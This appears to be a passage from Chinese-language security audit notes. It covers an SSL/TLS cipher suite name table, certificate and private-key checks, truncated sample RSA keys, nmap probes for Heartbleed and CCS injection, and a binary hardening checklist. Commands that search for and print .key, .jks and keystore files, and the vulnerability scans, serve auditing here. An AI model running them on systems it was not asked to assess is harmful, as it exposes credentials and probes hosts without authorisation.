    - SSL_DH_DSS_WITH_DES_CBC_SHA             DH-DSS-DES-CBC-SHA
    - SSL_DH_DSS_WITH_3DES_EDE_CBC_SHA        DH-DSS-DES-CBC3-SHA
    - SSL_DH_RSA_WITH_DES_CBC_SHA             DH-RSA-DES-CBC-SHA
    - SSL_DH_RSA_WITH_3DES_EDE_CBC_SHA        DH-RSA-DES-CBC3-SHA
    - SSL_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA   EXP-EDH-DSS-DES-CBC-SHA
    - SSL_DHE_DSS_WITH_DES_CBC_SHA            EDH-DSS-CBC-SHA
    - SSL_DHE_DSS_WITH_3DES_EDE_CBC_SHA       EDH-DSS-DES-CBC3-SHA
    - SSL_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA   EXP-EDH-RSA-DES-CBC-SHA
    - SSL_DHE_RSA_WITH_DES_CBC_SHA            EDH-RSA-DES-CBC-SHA
    - SSL_DHE_RSA_WITH_3DES_EDE_CBC_SHA       EDH-RSA-DES-CBC3-SHA
    - SSL_DH_anon_EXPORT_WITH_RC4_40_MD5      EXP-ADH-RC4-MD5
    - SSL_DH_anon_WITH_RC4_128_MD5            ADH-RC4-MD5
    - SSL_DH_anon_EXPORT_WITH_DES40_CBC_SHA   EXP-ADH-DES-CBC-SHA
    - SSL_DH_anon_WITH_DES_CBC_SHA            ADH-DES-CBC-SHA
    - SSL_DH_anon_WITH_3DES_EDE_CBC_SHA       ADH-DES-CBC3-SHA
    - SSL_FORTEZZA_KEA_WITH_NULL_SHA          Not implemented.
    - SSL_FORTEZZA_KEA_WITH_FORTEZZA_CBC_SHA  Not implemented.
    - SSL_FORTEZZA_KEA_WITH_RC4_128_SHA       Not implemented.
    - TLS_RSA_WITH_NULL_MD5                   NULL-MD5
    - TLS_RSA_WITH_NULL_SHA                   NULL-SHA
    - TLS_RSA_EXPORT_WITH_RC4_40_MD5          EXP-RC4-MD5
    - TLS_RSA_WITH_RC4_128_MD5                RC4-MD5
    - TLS_RSA_WITH_RC4_128_SHA                RC4-SHA
    - TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5      EXP-RC2-CBC-MD5
    - TLS_RSA_WITH_IDEA_CBC_SHA               IDEA-CBC-SHA
    - TLS_RSA_EXPORT_WITH_DES40_CBC_SHA       EXP-DES-CBC-SHA
    - TLS_RSA_WITH_DES_CBC_SHA                DES-CBC-SHA
    - TLS_RSA_WITH_3DES_EDE_CBC_SHA           DES-CBC3-SHA
    - TLS_DH_DSS_EXPORT_WITH_DES40_CBC_SHA    Not implemented.
    - TLS_DH_DSS_WITH_DES_CBC_SHA             Not implemented.
    - TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA        Not implemented.
    - TLS_DH_RSA_EXPORT_WITH_DES40_CBC_SHA    Not implemented.
    - TLS_DH_RSA_WITH_DES_CBC_SHA             Not implemented.
    - TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA        Not implemented.
    - TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA   EXP-EDH-DSS-DES-CBC-SHA
    - TLS_DHE_DSS_WITH_DES_CBC_SHA            EDH-DSS-CBC-SHA
    - TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA       EDH-DSS-DES-CBC3-SHA
    - TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA   EXP-EDH-RSA-DES-CBC-SHA
    - TLS_DHE_RSA_WITH_DES_CBC_SHA            EDH-RSA-DES-CBC-SHA
    - TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA       EDH-RSA-DES-CBC3-SHA
    - TLS_DH_anon_EXPORT_WITH_RC4_40_MD5      EXP-ADH-RC4-MD5
    - TLS_DH_anon_WITH_RC4_128_MD5            ADH-RC4-MD5
    - TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA   EXP-ADH-DES-CBC-SHA
    - TLS_DH_anon_WITH_DES_CBC_SHA            ADH-DES-CBC-SHA
    - TLS_DH_anon_WITH_3DES_EDE_CBC_SHA       ADH-DES-CBC3-SHA
    - TLS_RSA_WITH_AES_128_CBC_SHA            AES128-SHA
    - TLS_RSA_WITH_AES_256_CBC_SHA            AES256-SHA
    - TLS_DH_DSS_WITH_AES_128_CBC_SHA         DH-DSS-AES128-SHA
    - TLS_DH_DSS_WITH_AES_256_CBC_SHA         DH-DSS-AES256-SHA
    - TLS_DH_RSA_WITH_AES_128_CBC_SHA         DH-RSA-AES128-SHA
    - TLS_DH_RSA_WITH_AES_256_CBC_SHA         DH-RSA-AES256-SHA
    - TLS_DHE_DSS_WITH_AES_128_CBC_SHA        DHE-DSS-AES128-SHA
    - TLS_DHE_DSS_WITH_AES_256_CBC_SHA        DHE-DSS-AES256-SHA
    - TLS_DHE_RSA_WITH_AES_128_CBC_SHA        DHE-RSA-AES128-SHA
    - TLS_DHE_RSA_WITH_AES_256_CBC_SHA        DHE-RSA-AES256-SHA
    - TLS_DH_anon_WITH_AES_128_CBC_SHA        ADH-AES128-SHA
    - TLS_DH_anon_WITH_AES_256_CBC_SHA        ADH-AES256-SHA
    - TLS_RSA_WITH_CAMELLIA_128_CBC_SHA      CAMELLIA128-SHA
    - TLS_RSA_WITH_CAMELLIA_256_CBC_SHA      CAMELLIA256-SHA
    - TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA   DH-DSS-CAMELLIA128-SHA
    - TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA   DH-DSS-CAMELLIA256-SHA
    - TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA   DH-RSA-CAMELLIA128-SHA
    - TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA   DH-RSA-CAMELLIA256-SHA
    - TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA  DHE-DSS-CAMELLIA128-SHA
    - TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA  DHE-DSS-CAMELLIA256-SHA
    - TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA  DHE-RSA-CAMELLIA128-SHA
    - TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA  DHE-RSA-CAMELLIA256-SHA
    - TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA  ADH-CAMELLIA128-SHA
    - TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA  ADH-CAMELLIA256-SHA
    - TLS_RSA_WITH_SEED_CBC_SHA              SEED-SHA
    - TLS_DH_DSS_WITH_SEED_CBC_SHA           DH-DSS-SEED-SHA
    - TLS_DH_RSA_WITH_SEED_CBC_SHA           DH-RSA-SEED-SHA
    - TLS_DHE_DSS_WITH_SEED_CBC_SHA          DHE-DSS-SEED-SHA
    - TLS_DHE_RSA_WITH_SEED_CBC_SHA          DHE-RSA-SEED-SHA
    - TLS_DH_anon_WITH_SEED_CBC_SHA          ADH-SEED-SHA
    - TLS_GOSTR341094_WITH_28147_CNT_IMIT GOST94-GOST89-GOST89
    - TLS_GOSTR341001_WITH_28147_CNT_IMIT GOST2001-GOST89-GOST89
    - TLS_GOSTR341094_WITH_NULL_GOSTR3411 GOST94-NULL-GOST94
    - TLS_GOSTR341001_WITH_NULL_GOSTR3411 GOST2001-NULL-GOST94
    - TLS_RSA_EXPORT1024_WITH_DES_CBC_SHA     EXP1024-DES-CBC-SHA
    - TLS_RSA_EXPORT1024_WITH_RC4_56_SHA      EXP1024-RC4-SHA
    - TLS_DHE_DSS_EXPORT1024_WITH_DES_CBC_SHA EXP1024-DHE-DSS-DES-CBC-SHA
    - TLS_DHE_DSS_EXPORT1024_WITH_RC4_56_SHA  EXP1024-DHE-DSS-RC4-SHA
    - TLS_DHE_DSS_WITH_RC4_128_SHA            DHE-DSS-RC4-SHA
    - TLS_ECDH_RSA_WITH_NULL_SHA              ECDH-RSA-NULL-SHA
    - TLS_ECDH_RSA_WITH_RC4_128_SHA           ECDH-RSA-RC4-SHA
    - TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA      ECDH-RSA-DES-CBC3-SHA
    - TLS_ECDH_RSA_WITH_AES_128_CBC_SHA       ECDH-RSA-AES128-SHA
    - TLS_ECDH_RSA_WITH_AES_256_CBC_SHA       ECDH-RSA-AES256-SHA
    - TLS_ECDH_ECDSA_WITH_NULL_SHA            ECDH-ECDSA-NULL-SHA
    - TLS_ECDH_ECDSA_WITH_RC4_128_SHA         ECDH-ECDSA-RC4-SHA
    - TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA    ECDH-ECDSA-DES-CBC3-SHA
    - TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA     ECDH-ECDSA-AES128-SHA
    - TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA     ECDH-ECDSA-AES256-SHA
    - TLS_ECDHE_RSA_WITH_NULL_SHA             ECDHE-RSA-NULL-SHA
    - TLS_ECDHE_RSA_WITH_RC4_128_SHA          ECDHE-RSA-RC4-SHA
    - TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA     ECDHE-RSA-DES-CBC3-SHA
    - TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA      ECDHE-RSA-AES128-SHA
    - TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA      ECDHE-RSA-AES256-SHA
    - TLS_ECDHE_ECDSA_WITH_NULL_SHA           ECDHE-ECDSA-NULL-SHA
    - TLS_ECDHE_ECDSA_WITH_RC4_128_SHA        ECDHE-ECDSA-RC4-SHA
    - TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA   ECDHE-ECDSA-DES-CBC3-SHA
    - TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA    ECDHE-ECDSA-AES128-SHA
    - TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA    ECDHE-ECDSA-AES256-SHA
    - TLS_ECDH_anon_WITH_NULL_SHA             AECDH-NULL-SHA
    - TLS_ECDH_anon_WITH_RC4_128_SHA          AECDH-RC4-SHA
    - TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA     AECDH-DES-CBC3-SHA
    - TLS_ECDH_anon_WITH_AES_128_CBC_SHA      AECDH-AES128-SHA
    - TLS_ECDH_anon_WITH_AES_256_CBC_SHA      AECDH-AES256-SHA
    - TLS_RSA_WITH_NULL_SHA256                  NULL-SHA256
    - TLS_RSA_WITH_AES_128_CBC_SHA256           AES128-SHA256
    - TLS_RSA_WITH_AES_256_CBC_SHA256           AES256-SHA256
    - TLS_RSA_WITH_AES_128_GCM_SHA256           AES128-GCM-SHA256
    - TLS_RSA_WITH_AES_256_GCM_SHA384           AES256-GCM-SHA384
    - TLS_DH_RSA_WITH_AES_128_CBC_SHA256        DH-RSA-AES128-SHA256
    - TLS_DH_RSA_WITH_AES_256_CBC_SHA256        DH-RSA-AES256-SHA256
    - TLS_DH_RSA_WITH_AES_128_GCM_SHA256        DH-RSA-AES128-GCM-SHA256
    - TLS_DH_RSA_WITH_AES_256_GCM_SHA384        DH-RSA-AES256-GCM-SHA384
    - TLS_DH_DSS_WITH_AES_128_CBC_SHA256        DH-DSS-AES128-SHA256
    - TLS_DH_DSS_WITH_AES_256_CBC_SHA256        DH-DSS-AES256-SHA256
    - TLS_DH_DSS_WITH_AES_128_GCM_SHA256        DH-DSS-AES128-GCM-SHA256
    - TLS_DH_DSS_WITH_AES_256_GCM_SHA384        DH-DSS-AES256-GCM-SHA384
    - TLS_DHE_RSA_WITH_AES_128_CBC_SHA256       DHE-RSA-AES128-SHA256
    - TLS_DHE_RSA_WITH_AES_256_CBC_SHA256       DHE-RSA-AES256-SHA256
    - TLS_DHE_RSA_WITH_AES_128_GCM_SHA256       DHE-RSA-AES128-GCM-SHA256
    - TLS_DHE_RSA_WITH_AES_256_GCM_SHA384       DHE-RSA-AES256-GCM-SHA384
    - TLS_DHE_DSS_WITH_AES_128_CBC_SHA256       DHE-DSS-AES128-SHA256
    - TLS_DHE_DSS_WITH_AES_256_CBC_SHA256       DHE-DSS-AES256-SHA256
    - TLS_DHE_DSS_WITH_AES_128_GCM_SHA256       DHE-DSS-AES128-GCM-SHA256
    - TLS_DHE_DSS_WITH_AES_256_GCM_SHA384       DHE-DSS-AES256-GCM-SHA384
    - TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256      ECDH-RSA-AES128-SHA256
    - TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384      ECDH-RSA-AES256-SHA384
    - TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256      ECDH-RSA-AES128-GCM-SHA256
    - TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384      ECDH-RSA-AES256-GCM-SHA384
    - TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256    ECDH-ECDSA-AES128-SHA256
    - TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384    ECDH-ECDSA-AES256-SHA384
    - TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256    ECDH-ECDSA-AES128-GCM-SHA256
    - TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384    ECDH-ECDSA-AES256-GCM-SHA384
    - TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256     ECDHE-RSA-AES128-SHA256
    - TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384     ECDHE-RSA-AES256-SHA384
    - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256     ECDHE-RSA-AES128-GCM-SHA256
    - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384     ECDHE-RSA-AES256-GCM-SHA384
    - TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256   ECDHE-ECDSA-AES128-SHA256
    - TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384   ECDHE-ECDSA-AES256-SHA384
    - TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256   ECDHE-ECDSA-AES128-GCM-SHA256
    - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384   ECDHE-ECDSA-AES256-GCM-SHA384
    - TLS_DH_anon_WITH_AES_128_CBC_SHA256       ADH-AES128-SHA256
    - TLS_DH_anon_WITH_AES_256_CBC_SHA256       ADH-AES256-SHA256
    - TLS_DH_anon_WITH_AES_128_GCM_SHA256       ADH-AES128-GCM-SHA256
    - TLS_DH_anon_WITH_AES_256_GCM_SHA384       ADH-AES256-GCM-SHA384
    - TLS_PSK_WITH_RC4_128_SHA                  PSK-RC4-SHA
    - TLS_PSK_WITH_3DES_EDE_CBC_SHA             PSK-3DES-EDE-CBC-SHA
    - TLS_PSK_WITH_AES_128_CBC_SHA              PSK-AES128-CBC-SHA
    - TLS_PSK_WITH_AES_256_CBC_SHA              PSK-AES256-CBC-SHA
    - SSL_CK_RC4_128_WITH_MD5                 RC4-MD5
    - SSL_CK_RC4_128_EXPORT40_WITH_MD5        Not implemented.
    - SSL_CK_RC2_128_CBC_WITH_MD5             RC2-CBC-MD5
    - SSL_CK_RC2_128_CBC_EXPORT40_WITH_MD5    Not implemented.
    - SSL_CK_IDEA_128_CBC_WITH_MD5            IDEA-CBC-MD5
    - SSL_CK_DES_64_CBC_WITH_MD5              Not implemented.
    - SSL_CK_DES_192_EDE3_CBC_WITH_MD5        DES-CBC3-MD5

### Certificates

```bash
$ openssl s_client -connect example.com:443 | openssl x509 -noout -text

$ find . -name "*.pem"
$ find . -name "*.cer"
$ find . -name "*.crt"
$ find . -name "*.key"
$ find . -name "*.jks"
$ find . -name "*keystore*"
$ find . -name "*truststore*"
# 检查证书版本, 颁发者, 密钥长度, 加密算法
$ openssl x509 -in xxx.pem -text -noout | grep -E 'Version|Algorithm|Issuer|Public-Key'
# 私钥是否加密
$ cat xxx.key | grep -C 3 -e 'BEGIN.*PRIVATE'
# 文件权限
$ stat -c %a xxx.crt | grep -v 600 | grep -v 640
```

??? note "查看和验证私钥是否加密存储"
    ```bash tab="未加密查看"
    $ cat ca.key
    -----BEGIN RSA PRIVATE KEY-----
    MIIEpQIBAAKCAQEAuVLe3y+Iz8vrPp7Upb4FXwcy2dy/tnLZOSMBj+9wCiP/ktPa
    k4r7TcMd9hpKWJU2nIew15XKrjmQfhotVVp7sLW+Mn7OfhHumwoW+WemXzvIv59m
    QsdfivqCxdFZUA...PFI=
    -----END RSA PRIVATE KEY-----
    ```

    ```bash tab="加密查看" hl_lines="3"
    $ cat secca.key
    -----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: AES-256-CBC,E5F6C26A341C55AC9EC67A98D05E7546

    e8W9+g3dIt+ll+Uy94zmt25HkQo5lHHmZk5eaL0Mcp2LPeXCpQpcJMfOAYrtYSle
    RIiXtEzt7oCZ6PMMDhYEN+4Lug/6w1IwxvFAW1tf6LPKJOTroIuJxhQfW386i0y3
    /YNIxuGQJEsqDJC...OVHjAhBE
    -----END RSA PRIVATE KEY-----
    ```

    ```bash tab="未加密验证"
    $ openssl pkcs12 -export -out ca.p12 -in ca.crt -inkey ca.key
    Enter Export Password:
    Verifying - Enter Export Password:
    ```

    ```bash tab="加密验证方法一" hl_lines="2"
    $ openssl req -new -x509 -days 3650 -key secca.key -out secca.crt
    Enter pass phrase for secca.key:
    You are about to be asked to enter information that will be incorporated
    into your certificate request.
    What you are about to enter is what is called a Distinguished Name or a DN.
    There are quite a few fields but you can leave some blank
    For some fields there will be a default value,
    If you enter '.', the field will be left blank.
    -----
    Country Name (2 letter code) [AU]:
    State or Province Name (full name) [Some-State]:
    Locality Name (eg, city) []:
    Organization Name (eg, company) [Internet Widgits Pty Ltd]:
    Organizational Unit Name (eg, section) []:
    Common Name (e.g. server FQDN or YOUR name) []:
    Email Address []:
    ```

    ```bash tab="加密验证方法二" hl_lines="2"
    $ openssl pkcs12 -export -out secca.p12 -in secca.crt -inkey secca.key
    Enter pass phrase for secca.key:
    Enter Export Password:
    Verifying - Enter Export Password:
    ```

### Secure Renegotiation

```bash
$ openssl s_client -connect example:443
Secure Renegotiation IS NOT supported
Secure Renegotiation IS supported
```

### Compression

```bash
$ openssl s_client -connect example:443
Compression: zlib compression
Compression: NONE
```

- 测试是否存在心脏滴血: `nmap -p 443 --script ssl-heartbleed --script-args vulns.showall example.com`
- 测试是否存在Change Cipher Spec Injection: `nmap -p 443 --script ssl-ccs-injection example.com`

!!! quote "参考链接: [手工测试SSL/TLS的脆弱性](http://bobao.360.cn/learning/detail/479.html)"

## 安全编译选项

1. 判断二进制文件类型: `file xxx`
1. 将readelf拷贝到/usr/bin, `readelf -a xxx`

    判断是否Go语言应用：Section to Segment mapping中包含`.gosymtab .gopclntab`字样

    !!! quote "参考链接: [golang语言编译的二进制可执行文件为什么比 C 语言大](https://www.cnxct.com/why-golang-elf-binary-file-is-large-than-c/)"

1. `./checksec --file=xxx`
    1. STACK CANARY: 栈保护(**SP**), 包含Linux内核态
    1. **RELRO**: GOT表保护
    1. **BIND_NOW**: 立即绑定
    1. **PIC**: 地址无关
    1. **PIE**: 随机化, Windows平台 **DYNAMICBASE**
    1. **NX**: 堆栈不可执行, Windows平台数据执行保护(**DEP**)
    1. Strip: 删除符号表(Linux可选, Android必选)
    1. **Rpath/RunPath**: 动态库搜索路径(禁选)
    1. FS: Fortify Source(可选)
    1. Ftrapv: 整数溢出检查(可选)
    1. ASLR: 缓冲区溢出, Windows平台 **GS**
    1. Visibility: (可选)
    1. Stack Check: (可选)
    1. **SAFESEH**: Windows平台安全异常处理
